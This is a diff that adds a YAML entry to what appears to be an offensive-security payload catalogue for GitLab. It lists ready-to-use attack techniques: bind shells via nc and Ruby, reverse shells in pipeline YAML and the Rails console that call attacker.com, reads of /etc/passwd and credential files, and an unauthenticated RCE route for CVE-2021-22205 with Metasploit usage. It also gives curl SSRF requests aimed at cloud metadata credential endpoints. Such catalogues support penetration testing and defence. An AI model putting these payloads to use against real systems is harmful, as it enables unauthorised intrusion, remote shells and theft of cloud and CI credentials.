@@ -1,0 +1,191 @@
+---
+comment: |
+  GitLab provides code execution vectors through its CI/CD pipeline system (`.gitlab-ci.yml`),
+  the Rails console on self-hosted instances, and the admin panel available to GitLab
+  administrators. CI/CD pipelines run arbitrary shell commands on registered GitLab Runners,
+  which may be shared across projects or self-hosted with broad network access.
+
+  CVE-2021-22205 (CVSS 10.0, CISA KEV): GitLab CE/EE passes user-uploaded images through
+  ExifTool for metadata parsing without authentication. A crafted DjVu file exploits a
+  command injection in ExifTool's DjVu parser (CVE-2021-22204), achieving unauthenticated
+  RCE as the `git` user on the GitLab server.
+  Affects GitLab CE/EE 11.9 through 13.10.2 / 13.9.4 / 13.8.6.
+functions:
+  bind-shell:
+  - code: |
+      stages:
+        - bind
+
+      bind_shell:
+        stage: bind
+        script:
+          - nc -lvp 12345 -e /bin/sh
+    comment: "Opens a bind shell on TCP port 12345 via a CI/CD pipeline step on the\
+      \ Runner machine.\nRequires `nc` with the `-e` flag (standard on Debian/Ubuntu\
+      \ runners).\nThe pipeline job hangs while the shell is active \u2014 connect\
+      \ from the attacker with:\n  nc victim.com 12345\nInbound firewall rules on\
+      \ the Runner may block the port.\n"
+    connector: tcp-client
+    contexts:
+      authenticated:
+      ci_cd:
+    tty: false
+  - code: |
+      require 'socket'
+      server = TCPServer.new("0.0.0.0", 12345)
+      client = server.accept
+      exec "/bin/sh", in: client, out: client, err: client
+    comment: |
+      Bind shell via the GitLab Rails console on the application server itself (not a Runner).
+      The console process blocks waiting for a connection on port 12345. Once connected,
+      `/bin/sh` replaces the Ruby process with the client socket as stdin/stdout/stderr.
+      Connect from the attacker with: nc victim.com 12345
+    connector: tcp-client
+    contexts:
+      admin:
+      console:
+    tty: false
+  file-read:
+  - code: |
+      puts File.read("/etc/passwd")
+    comment: |
+      Read a file from the GitLab application server via the Rails console. Useful for
+      extracting `gitlab.rb`, database credentials, or secret key files.
+    contexts:
+      admin:
+      console:
+  - code: |
+      stages:
+        - exfil
+
+      read_file:
+        stage: exfil
+        script:
+          - cat /etc/passwd
+        artifacts:
+          paths:
+            - /etc/passwd
+          when: always
+    comment: |
+      Exfiltrate a file from the Runner's filesystem via a CI/CD pipeline step. The artifact
+      is uploaded to GitLab and downloadable from the pipeline UI at
+      CI/CD > Pipelines > <job> > Artifacts.
+    contexts:
+      authenticated:
+      ci_cd:
+  rce:
+  - code: |
+      # Use the Metasploit module for automated payload generation and delivery:
+      #   use exploit/multi/http/gitlab_exiftool_file_read_rce
+      #   set RHOSTS victim.com
+      #   set LHOST attacker.com
+      #   set LPORT 12345
+      #   run
+
+      # Manual: upload a crafted DjVu file to any GitLab image upload endpoint
+      curl -s -X POST "http://victim.com/users/sign_in" \
+        -F "file=@exploit.jpg;type=image/jpeg"
+    comment: "\u26A0\uFE0F CISA KEV \u2014 confirmed exploited in the wild.\nCVE-2021-22205:\
+      \ GitLab's file upload endpoint passes uploaded images to ExifTool\nwithout\
+      \ authentication. ExifTool's DjVu parser is vulnerable to argument injection\n\
+      (CVE-2021-22204), allowing OS command execution embedded in the file metadata.\n\
+      \nThe crafted DjVu file disguised as a JPEG is processed by ExifTool on upload,\n\
+      executing the embedded payload as the `git` user on the GitLab application server.\n\
+      Use github.com/inspiringgroup/CVE-2021-22205 to generate the malicious file.\n\
+      \nRef: https://www.exploit-db.com/exploits/49968\nnuclei: CVE-2021-22205\n"
+    contexts:
+      unauthenticated:
+    version: |-
+      11.9 - 13.10.2 / 13.9.4 / 13.8.6
+  - code: |
+      stages:
+        - exec
+
+      run:
+        stage: exec
+        script:
+          - id
+          - env
+    comment: |
+      A `.gitlab-ci.yml` pipeline executes arbitrary shell commands on a GitLab Runner.
+      Push this file to any branch of a project with CI/CD enabled, or create a pipeline
+      via the UI under CI/CD > Pipelines > Run Pipeline. The Runner's OS user and environment
+      variables (including masked CI/CD variables) are accessible.
+    contexts:
+      authenticated:
+      ci_cd:
+  - code: |
+      `id`
+    comment: |
+      The GitLab Rails console provides direct access to the Ruby on Rails application runtime
+      on self-hosted instances. Accessible via `gitlab-rails console` on the server, or through
+      `docker exec` in containerized deployments. Executes OS commands as the `git` user.
+    contexts:
+      admin:
+      console:
+  reverse-shell:
+  - blind: true
+    code: |
+      stages:
+        - shell
+
+      reverse_shell:
+        stage: shell
+        script:
+          - bash -i >& /dev/tcp/attacker.com/12345 0>&1
+    comment: "Execute a reverse shell as a CI/CD pipeline step. The shell runs as\
+      \ the GitLab Runner's\nOS user on the Runner machine, not the GitLab server.\
+      \ Push to any CI/CD-enabled branch.\nOutput goes to the attacker's listener\
+      \ \u2014 the GitLab job log shows the step as running\nuntil the connection\
+      \ is dropped.\n"
+    contexts:
+      authenticated:
+      ci_cd:
+    listener: tcp-server
+    tty: false
+  - blind: true
+    code: |
+      require 'socket'
+      f = TCPSocket.open("attacker.com", 12345).to_i
+      exec sprintf("/bin/sh -i <&%d >&%d 2>&%d", f, f, f)
+    comment: "Reverse shell from the GitLab Rails console, executing in the context\
+      \ of the `git` user\non the GitLab application server. Requires server-level\
+      \ access to the Rails console.\nThe TCP socket carries all I/O \u2014 the Rails\
+      \ console session ends once exec() replaces\nthe current process.\n"
+    contexts:
+      admin:
+      console:
+    listener: tcp-server
+    tty: false
+  ssrf:
+  - code: |
+      # Create a project with an import URL pointing to an internal endpoint (authenticated)
+      curl -s -X POST "http://victim.com/api/v4/projects" \
+        -H "PRIVATE-TOKEN: <api_token>" \
+        -H "Content-Type: application/json" \
+        -d '{
+          "name": "probe",
+          "path": "probe",
+          "import_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        }'
+
+      # Register a webhook pointing to an internal endpoint, then push to trigger it:
+      curl -s -X POST "http://victim.com/api/v4/projects/<project_id>/hooks" \
+        -H "PRIVATE-TOKEN: <api_token>" \
+        -H "Content-Type: application/json" \
+        -d '{"url": "http://169.254.169.254/latest/meta-data/", "push_events": true}'
+    comment: "GitLab's project import feature fetches an external Git repository URL\
+      \ server-side.\nSupplying an internal URL causes the GitLab server to make an\
+      \ outbound HTTP GET to\nthe target \u2014 import errors or logs may reflect\
+      \ the response body or status code.\n\nThe webhook vector triggers an HTTP POST\
+      \ from the GitLab server to any configured URL\non push, merge request, or pipeline\
+      \ events. GitLab logs the response status code.\n\nNote: since GitLab 10.6,\
+      \ outbound requests to local/private networks from webhooks\nrequire admin to\
+      \ enable \"Allow requests to the local network from web hooks and services\"\
+      \nat Admin > Settings > Network. The import_url path is less restricted by default.\n\
+      \nTarget cloud metadata endpoints:\n- AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\
+      - GCP: http://metadata.google.internal/computeMetadata/v1/\n- Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01\n"
+    contexts:
+      api_token:
+      authenticated:
+...
